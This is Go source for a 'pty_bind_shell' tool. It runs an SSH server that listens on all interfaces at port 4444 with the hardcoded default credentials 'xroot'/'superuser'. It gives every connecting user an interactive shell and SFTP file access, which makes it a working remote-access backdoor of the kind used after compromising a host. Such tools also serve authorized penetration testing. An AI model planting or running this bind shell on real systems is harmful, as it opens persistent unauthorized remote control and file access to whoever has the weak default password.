package main

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"

	"github.com/akamensky/argparse"
	"github.com/creack/pty"
	"github.com/fatih/color"
	"github.com/gliderlabs/ssh"
	"github.com/pkg/sftp"
	"golang.org/x/term"
)

func simpleCommandShellHandler(s ssh.Session) {
	term := term.NewTerminal(s, ">")
	for {
		line, err := term.ReadLine()
		if err != nil {
			break
		}
		in := strings.Split(line, " ")
		if in[0] == "" {
			continue
		}
		if in[0] == "exit" {
			break
		}
		exe := exec.Command(in[0], in[1:]...)
		out, err := exe.Output()
		if err != nil {
			term.Write([]byte(err.Error() + "\n"))
		}
		term.Write(out)
	}
}

func requestUserInput(term *term.Terminal, requestText string, defaultVal string) (val string) {
	_val := defaultVal
	for {
		term.Write([]byte(requestText))
		line, err := term.ReadLine()
		if err != nil {
			break
		}
		if line == "" {
			break
		} else {
			_val = line
			break
		}
	}
	return _val
}

func confirmShellConfig(s ssh.Session) (size pty.Winsize, shell string) {
	term := term.NewTerminal(s, ">")
	cols, _ := strconv.ParseUint(requestUserInput(term, "Please input winsize Cols [150]: \n", "150"), 10, 10)
	rows, _ := strconv.ParseInt(requestUserInput(term, "Please input winsize Rows [70]: \n", "70"), 10, 10)
	shellPath := requestUserInput(term, "Please input shell path [/bin/sh]: \n", "/bin/sh")
	winsize := pty.Winsize{
		Cols: uint16(cols),
		Rows: uint16(rows),
	}
	return winsize, shellPath
}

func exit_on_error(message string, err error) {
	if err != nil {
		color.Red(message)
		fmt.Println(err)
		os.Exit(0)
	}
}

func main() {
	parser := argparse.NewParser("pty_bind_shell", "")
	var HOST *string = parser.String("H", "host", &argparse.Options{Required: false, Default: "0.0.0.0", Help: "Host to bind or connect to"})
	var PORT *string = parser.String("P", "port", &argparse.Options{Required: false, Default: "4444", Help: "Port to bind or connect to"})
	var USERNAME *string = parser.String("u", "username", &argparse.Options{Required: false, Default: "xroot", Help: "SSH username"})
	var PASSWORD *string = parser.String("p", "password", &argparse.Options{Required: false, Default: "superuser", Help: "SSH password"})
	err := parser.Parse(os.Args)
	exit_on_error("[PARSER ERROR]", err)
	server := ssh.Server{
		Addr: *HOST + ":" + *PORT, // IP and PORT to connect on
		PasswordHandler: ssh.PasswordHandler(func(ctx ssh.Context, pass string) bool {
			return pass == *PASSWORD && ctx.User() == *USERNAME
		}),
		SubsystemHandlers: map[string]ssh.SubsystemHandler{
			"sftp": SftpHandler,
		},
		Handler: func(s ssh.Session) {
			if runtime.GOOS == "windows" {
				io.WriteString(s, "\n[-] Windows dont have tty, using simple command shell.\n")
				simpleCommandShellHandler(s)
			} else {
				winsize, shell := confirmShellConfig(s)
				c := exec.Command(shell)
				_pty, _err := pty.StartWithSize(c, &winsize)
				if _err != nil {
					io.WriteString(s, "\n[-] Spawn pty failed, using simple command shell.\n")
					simpleCommandShellHandler(s)
				} else {
	
					defer func() { _ = _pty.Close() }()
					go func() {
						for {
							buffer := make([]byte, 1024)
							length, _ := s.Read(buffer)
							if length > 0 {
								_pty.Write(buffer[:length])
							} else {
								_pty.Close()
								c.Process.Kill()
								break
							}
						}
					}()
					for {
						buffer := make([]byte, 1024)
						length, _ := _pty.Read(buffer)
						if length > 0 {
							s.Write(buffer[:length])
						} else {
							_pty.Close()
							c.Process.Kill()
							break
						}
					}
				}
			}
		},
	}
	server.ListenAndServe()
}
